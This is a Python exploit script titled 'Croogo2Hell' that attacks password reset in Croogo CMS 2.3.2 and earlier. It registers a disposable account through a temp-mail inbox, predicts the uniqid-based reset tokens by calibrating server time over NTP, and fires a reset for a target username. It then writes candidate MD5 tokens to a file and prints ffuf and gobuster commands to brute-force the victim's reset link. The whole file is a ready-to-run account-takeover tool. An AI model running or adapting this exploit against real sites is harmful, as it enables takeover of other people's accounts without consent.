from uniqid import *
import ntplib
import time
from bs4 import BeautifulSoup
import requests
import re
from hashlib import md5 as md5
from TempMail import TempMail
import statistics
import argparse
from colorama import Fore, Back, Style, init

init(autoreset=True)
# Some constants
s = requests.Session()
data_dict = {}
user_known = generate_uniqid()
tmp = TempMail()
inb = TempMail.generateInbox(tmp)
tmp_email = inb.address
token_tmpmail = inb.token

def get_unix_ntp_time(host="europe.pool.ntp.org"):
    try:
        c = ntplib.NTPClient()
        response = c.request(host)
        return response.tx_time
    except Exception as e:
        print("Error:", e)
        
    return None

def fetchMail():
    emailsreceived = TempMail.getEmails(tmp, inbox=inb)
    i = 0
    if emailsreceived != []: # Doesn't take into account the activation email
        while "activer" in emailsreceived[i].body or "activate" in emailsreceived[i].body: # Only works for FR - EN
            i += 1
        link = url_pattern.findall(emailsreceived[i].body)
        y = link[0].split('/')
        return y[-1] 
    return 0

def construct_req_reset(username):
    global data_dict, url_reset
    data_dict = {}
    # We find the vars necessary to the request
    soup = s.get(url_reset + "?ajax=true").text
    soup = BeautifulSoup(soup, 'html.parser')
    pattern = re.compile('data\[_Token\]')
    element = soup.find_all(attrs={"name": pattern})
    if element:
        for x in element:
            name = x.get('name')
            value = x.get('value')
            data_dict[name] = value
    else:
        print(Fore.RED + "Element not found, you sure this is Croogo =<2.3.2 ?")
    data_dict["_method"] = "POST"
    data_dict["data[User][username]"] = username
    return data_dict

def construct_req_register(username, email, password, uname):
    global data_dict, url_register
    data_dict = {}
    # We find the vars necessary to the request
    soup = s.get(url_register + "?ajax=true").text
    soup = BeautifulSoup(soup, 'html.parser')
    pattern = re.compile('data\[_Token\]')
    element = soup.find_all(attrs={"name": pattern})
    if element:
        for x in element:
            name = x.get('name')
            value = x.get('value')
            data_dict[name] = value
    else:
        print(Fore.RED + "Element not found, you sure this is Croogo =<2.3.2 ?")
    data_dict["_method"] = "POST"
    data_dict["data[User][username]"] = username
    data_dict["data[User][password]"] = password
    data_dict["data[User][verify_password]"] = password
    data_dict["data[User][email]"] = email
    data_dict["data[User][name]"] = uname
    data_dict["data[User][website]"] = ""
    new_data = {k: data_dict[k] for k in ['_method', 'data[_Token][key]', 'data[User][username]', 'data[User][password]', 'data[User][verify_password]', 'data[User][name]', 'data[User][email]', 'data[User][website]', 'data[_Token][fields]', 'data[_Token][unlocked]']}
    return new_data

def registerUser():
    pass_user = "Azerty123"
    email = tmp_email
    username = user_known
    name = "autotest"
    postreq = construct_req_register(username, email, pass_user, name)
    reg_req = s.post(url_register + "?ajax=true", data=postreq, allow_redirects=False)
    print(Fore.YELLOW + "Register request sent")
    if reg_req.status_code == 302:
        print(Fore.GREEN + "User registered with success\n")
    else:
        print(Fore.RED + "Error while registering the user, registration may not be enabled, you'll have to find another way...")
    return

def get_offset_for_request(rounds=10, correction=0):
    
    offsets = []
    for _ in range(rounds):
        print(f"Round {_}")
        post_content = construct_req_reset(user_known)
        timestamp_ntp = get_unix_ntp_time(pool)
        if timestamp_ntp == None: # Handling ntp error, ntp servers aren't built for high-freq querying so it might fail sometimes
            print(Fore.RED + "Error from NTP server, next interation...")
            _ += 1
            continue
        res_req = s.post(url_reset, data=post_content)
        time.sleep(0.5)
        current_hash = fetchMail()
        if current_hash == 0:
            print(Fore.RED + "Error fetching hash from email")
            _ += 1
            continue
        print(f"Hash fetched from email {current_hash}")
        guesslist = uniqids_around_timestamp(timestamp_ntp, rangeplus=time_offset)
        hashed_guess = [md5(x.encode()).hexdigest() for x in guesslist]
        if current_hash not in hashed_guess:
            print(Fore.RED + "Hash not found in the guess list, if this happens too often, consider increasing --offset")
            continue
        pos_hash = hashed_guess.index(current_hash)
        guessed_uniq = guesslist[pos_hash]
        guessed_serv_time = uniqid_to_epoch(guessed_uniq)
        timestamp_ntp = timestamp_ntp + correction
        offf = round(guessed_serv_time - timestamp_ntp, 6)
        print(f"We were off by {Fore.GREEN}{offf}{Fore.RESET}")
        offsets.append(offf)
    median_offset = statistics.median(offsets)
    maxo = max(offsets)
    mino = min(offsets)
    nb_req = int(abs(maxo-mino) * 1e6)
    print(f"Median Offset over {rounds} rounds: {Fore.GREEN}{median_offset}{Fore.RESET} seconds")
    
    if correction != 0:
        print(f"Maximum offset: {Fore.GREEN}{maxo}{Fore.RESET} seconds after the request was sent (corrected)")
        print(f"Minimum offset: {Fore.GREEN}{mino}{Fore.RESET} seconds after the request was sent (corrected)")
        print(f"Should be around {Fore.GREEN}{nb_req}{Fore.RESET} requests")
        return mino,maxo
    else:
        suggested_correction = round(median_offset, 2)
        return suggested_correction

def sendMaliciousRequest(target_username):
    post_content = construct_req_reset(target_username)
    timestamp_ntp = get_unix_ntp_time(pool)
    res_req = s.post(url_reset, data=post_content)
    print(f"{Fore.GREEN}Malicious request sent !{Fore.RESET}")
    return timestamp_ntp

def main():
    global url_register,url_reset,url_pattern,time_offset,pool
    parser = argparse.ArgumentParser(description='Croogo2Hell')
    parser.add_argument('--url', type=str, help='Domain name of the target (without https://)', required=True)
    parser.add_argument('--user', type=str, help='Username of the account we are attacking', required=True)
    parser.add_argument('--pool', type=str, help='NTP pool to use (default to europe.pool.ntp.org)', required=False, default="europe.pool.ntp.org")
    parser.add_argument('--output', type=str, help='Output filename, default to tokenslist.txt (overwrote if already exist)', default="tokenslist.txt", required=False)
    parser.add_argument('--offset', type=int, help='Time offset to generate the initial cracking list from the known account. Default to 0.7 (1.4 mil. hashes) (Usually don\'t need to adjust this, if  the script can\'t find any offset, try changing the ntp server to one closer one to target, or increment this, but be careful here, small increase could lead to really huge number generated (0.01-0.05) increment recommended)', default=0.7, required=False)
    args = parser.parse_args()

    url_reset = f"https://{args.url}/users/users/forgot"
    url_register = f"https://{args.url}/users/users/add"

    userattack = args.user
    time_offset = args.offset
    pool = args.pool
    url_pattern = re.compile(r'https?://\S+|ftp://\S+')

    print(Fore.YELLOW + "Registering a test user...")
    registerUser()
    time.sleep(0.5)

    print(Fore.YELLOW + "Getting inital server offset for auto adjust (initial rounds)")
    correction = get_offset_for_request(10)

    print(f"{Fore.GREEN}Done ! Calculated base offset is {correction}{Fore.RESET}\n")

    print(Fore.YELLOW + "Fetching request time range (final rounds):")
    min_off, max_off = get_offset_for_request(10,correction=correction)

    print(Fore.YELLOW + "\nSending malicious reset password request")
    timestamp_attack = sendMaliciousRequest(userattack)

    print("\nGenerating potential token list...")
    if min_off > 0:
        tokenlist = uniqids_around_timestamp(timestamp_attack + correction, max_off)
    elif min_off < 0 and max_off > 0:
        tokenlist = uniqids_around_timestamp(timestamp_attack + correction, max_off, abs(min_off))
    elif min_off < 0 and max_off < 0:
        tokenlist = uniqids_around_timestamp(timestamp_attack + correction, rangeplus=0.02, rangeminus=abs(min_off))

    hashedtokens =[md5(x.encode()).hexdigest() for x in tokenlist]

    print(f"Done ! We have generated {Fore.GREEN}{len(hashedtokens)}{Fore.RESET} tokens")
    print("You could use this list with dirb, ffuf, gobuster etc... (any fuzzing tool will do the job)")
    with open(args.output, 'w') as f:
        for x in hashedtokens:
            line = x + "\n"
            f.write(line)
    print(f"ffuf -mc 200 -w {args.output} -u https://{args.url}/users/users/reset/{args.user}/FUZZ")
    print(f"gobuster dir -s 200 -w {args.output} -u https://{args.url}/users/users/reset/{args.user}/ -t 4 -b \"\"")

main()